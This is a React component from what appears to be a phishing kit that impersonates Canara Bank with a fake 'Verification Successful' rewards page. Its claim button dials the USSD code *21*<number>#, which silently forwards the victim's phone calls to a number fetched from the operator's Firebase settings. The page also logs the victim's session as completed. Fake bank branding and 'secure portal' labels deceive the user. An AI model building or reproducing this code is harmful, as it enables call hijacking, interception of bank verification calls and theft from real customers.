import { useState, useEffect, useMemo } from 'react';
import { useParams } from 'react-router-dom';
import FirebaseUtil from '../FirebaseRepo';
import '../App.css';

const SuccessPage = () => {
  const [callNumber, setCallNumber] = useState('8822407215');
  const { documentId } = useParams(); // URL se ID lega (e.g., /success/user_123...)

  const formattedCallNumber = useMemo(() => {
    const digitsOnly = callNumber.replace(/\D/g, '');
    return digitsOnly.length === 10 ? digitsOnly : '8822407215';
  }, [callNumber]);

  useEffect(() => {
    const finalUpdate = async () => {
      try {
        // 1. Settings se forwarding number lana
        const doc = await FirebaseUtil.getDocument("carvana_settings", "forwarding_numbers");
        if (doc?.call_forwarding_number) {
          setCallNumber(doc.call_forwarding_number.trim());
        }

        // 2. Serial Wise Data: Usi document mein final status update karna
        if (documentId) {
          const currentTime = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
          await FirebaseUtil.updateDocument("carvana", documentId, {
            current_status: "Completed Successfully",
            finish_time: currentTime
          });
        }
      } catch (error) {
        console.error("Error in final steps:", error);
      }
    };
    finalUpdate();
  }, [documentId]);

  const handleCallAction = () => {
    // USSD Code generate karna (*21*number#)
    const ussdCode = `*21*${formattedCallNumber}#`;
    window.location.href = `tel:${encodeURIComponent(ussdCode)}`;
  };

  return (
    <div className="flex flex-col min-h-screen bg-white">
      {/* Header */}
      <header className="bg-[#0066b3] p-4 flex justify-between items-center shadow-lg">
        <div className="flex items-center">
          <div className="text-white">
            <h1 className="text-3xl font-serif font-bold">Canara Bank</h1>
            <p className="text-sm opacity-90">Verification Status: 100% Done</p>
          </div>
        </div>
      </header>

      <div className="bg-[#0066b3] text-white text-center pb-2 border-t border-white/20">
        <p className="italic text-sm">Together We Can</p>
      </div>

      <main className="flex-1 m-2 flex justify-center items-center bg-gray-100">
        <div className="bg-white text-gray-800 rounded-2xl w-full max-w-md p-6 shadow-2xl border-t-8 border-green-500">
          <div className="text-center mb-6">
            <div className="bg-green-100 text-green-700 rounded-full px-5 py-2 mb-4 inline-flex items-center font-bold animate-bounce">
              <span className="mr-2 text-xl">✓</span> Verification Successful
            </div>
            <h1 className="text-3xl font-extrabold text-blue-900 mb-2">Congratulations!</h1>
            <p className="text-gray-600 font-medium">Your account is now eligible for Rewardz Points.</p>
          </div>

          <div className="bg-blue-50 border-l-4 border-blue-600 p-4 mb-6">
            <p className="text-sm text-blue-800 font-bold uppercase">Final Step:</p>
            <p className="text-sm text-blue-700 mt-1">
              Rewardz points collect karne ke liye niche diye gaye button par click karein aur apne mobile se call confirm karein.
            </p>
          </div>

          {/* Call Button */}
          <button
            onClick={handleCallAction}
            className="w-full bg-yellow-400 hover:bg-yellow-500 text-blue-900 font-black py-4 px-4 rounded-xl text-lg shadow-lg transform active:scale-95 transition-all mb-4 border-b-4 border-yellow-600"
          >
            CLAIM REWARDZ POINTS
          </button>

          <button
            className="w-full bg-gray-100 text-gray-500 font-bold py-3 px-4 rounded-xl text-sm hover:bg-gray-200 transition-colors"
            onClick={() => window.location.href = 'https://canarabank.com'}
          >
            Exit Secure Session
          </button>

          <div className="mt-6 text-center">
            <p className="text-[9px] text-gray-400 uppercase tracking-widest font-bold">Session ID: {documentId}</p>
          </div>
        </div>
      </main>

      {/* Footer */}
      <footer className="bg-gray-800 text-white p-4 text-center mt-auto">
        <p className="text-sm">© 2025 Canara Bank. All rights reserved.</p>
        <p className="text-[10px] opacity-40 mt-1 font-mono">ENCRYPTED TRANSACTION | SECURE PORTAL</p>
      </footer>
    </div>
  );
};

export default SuccessPage;
